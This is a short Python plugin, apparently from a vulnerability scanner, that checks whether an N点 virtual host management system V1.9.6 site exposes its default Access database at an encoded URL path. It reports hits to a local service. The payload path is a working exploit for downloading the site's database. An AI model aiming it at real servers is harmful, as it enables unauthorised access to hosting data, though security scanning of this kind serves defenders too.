#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: N点虚拟主机管理系统V1.9.6版数据库下载漏洞
referer: http://www.wooyun.org/bugs/wooyun-2014-061151
author: Lucifer
description: N点虚拟主机管理系统默认数据库名#host # date#196.mdb。url直接输入不行,这里替换下#->%23 空格->=,即可下载数据库文件。
'''
import sys
import warnings
import requests
from termcolor import cprint

class npoint_mdb_download_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/host_date/%23host%20%23%20date%23196.mdb"
        vulnurl = self.url + payload
        try:
            req = requests.head(vulnurl, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/x-msaccess":
                cprint("[+]存在N点虚拟主机管理系统数据库下载漏洞...(高危)\tpayload: "+vulnurl, "red")
                postdata = {self.url:"存在N点虚拟主机管理系统数据库下载漏洞...(高危)\tpayload: "+vulnurl}
                requests.post('http://localhost:8848/system', json=postdata) 
            else:
                cprint("[-]不存在npoint_mdb_download漏洞", "white", "on_grey")

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = npoint_mdb_download_BaseVerify(sys.argv[1])
    testVuln.run()